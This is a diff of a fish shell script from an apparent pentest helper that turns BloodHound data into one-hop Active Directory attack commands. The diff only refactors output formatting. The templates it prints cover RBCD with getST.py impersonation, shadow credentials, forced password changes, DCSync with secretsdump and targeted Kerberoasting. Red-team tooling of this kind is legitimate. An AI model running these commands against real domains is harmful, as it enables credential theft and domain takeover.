@@ -2,17 +2,11 @@ function __ezpz_path_print --argument-names command
     printf '%s\n' (__ezpz_cmd_format "$command")
 end
 
-function __ezpz_path_getst --argument-names base domain user secret hash dc spn target_user mode
-    set -l command
+function __ezpz_path_getst --argument-names base domain user secret hash dc spn target_user
     if test -n "$hash"
-        set command "getST.py -spn $spn -impersonate $target_user -dc-ip $dc -hashes '$hash' '$domain/$user'"
+        printf '%s\n' "getST.py -spn $spn -impersonate $target_user -dc-ip $dc -hashes '$hash' '$domain/$user'"
     else
-        set command "getST.py -spn $spn -impersonate $target_user -dc-ip $dc '$domain/$user:$secret@$dc'"
-    end
-    if test "$mode" = option
-        ezpz_cmd "$command"
-    else
-        printf '%s\n' "$command"
+        printf '%s\n' "getST.py -spn $spn -impersonate $target_user -dc-ip $dc '$domain/$user:$secret@$dc'"
     end
 end
 
@@ -27,18 +21,18 @@ end
 function __ezpz_path_generic --argument-names base target target_type target_name user domain secret hash dc
     switch $target_type
         case User
-            ezpz_info "Option 1: change password"
-            ezpz_cmd "$base set password $target '<NEWPASS>'"
-            ezpz_info "Option 2: shadow credentials"
-            ezpz_cmd "$base add shadowCredentials $target"
+            ezpz_cmd "Option 1: change password"
+            __ezpz_path_print "$base set password $target '<NEWPASS>'"
+            ezpz_cmd "Option 2: shadow credentials"
+            __ezpz_path_print "$base add shadowCredentials $target"
         case Group
             __ezpz_path_print "$base add groupMember $target $user"
         case Computer
-            ezpz_info "Option 1: shadow credentials"
-            ezpz_cmd "$base add shadowCredentials $target"
-            ezpz_info "Option 2: RBCD + getST"
-            ezpz_cmd "$base add rbcd $target $user"
-            __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>" option
+            ezpz_cmd "Option 1: shadow credentials"
+            __ezpz_path_print "$base add shadowCredentials $target"
+            ezpz_cmd "Option 2: RBCD + getST"
+            __ezpz_path_print "$base add rbcd $target $user"
+            __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
         case Domain
             __ezpz_path_print "$base add dcsync $user"
             __ezpz_path_secretsdump "$domain" "$user" "$secret" "$hash" "$dc"
@@ -192,20 +186,20 @@ Shows one-hop AD attack paths for a user from BloodHound data.
             case GenericWrite
                 switch $target_type
                     case User
-                        ezpz_info "Option 1: shadow credentials"
-                        ezpz_cmd "$base add shadowCredentials $target"
-                        ezpz_info "Option 2: targeted Kerberoast"
+                        ezpz_cmd "Option 1: shadow credentials"
+                        __ezpz_path_print "$base add shadowCredentials $target"
+                        ezpz_cmd "Option 2: targeted Kerberoast"
                         if test -n "$hash"
-                            ezpz_cmd "targetedkerberoast -d $domain -H '$hash' --request-user $target"
+                            __ezpz_path_print "targetedkerberoast -d $domain -H '$hash' --request-user $target"
                         else
-                            ezpz_cmd "targetedkerberoast -d $domain -u $source_user -p '$secret' --request-user $target"
+                            __ezpz_path_print "targetedkerberoast -d $domain -u $source_user -p '$secret' --request-user $target"
                         end
                     case Computer
-                        ezpz_info "Option 1: shadow credentials"
-                        ezpz_cmd "$base add shadowCredentials $target"
-                        ezpz_info "Option 2: RBCD + getST"
-                        ezpz_cmd "$base add rbcd $target $source_user"
-                        __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>" option
+                        ezpz_cmd "Option 1: shadow credentials"
+                        __ezpz_path_print "$base add shadowCredentials $target"
+                        ezpz_cmd "Option 2: RBCD + getST"
+                        __ezpz_path_print "$base add rbcd $target $source_user"
+                        __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
                     case '*'
                         printf '%s\n' "No bloodyAD template for GenericWrite on $target_type target."
                 end
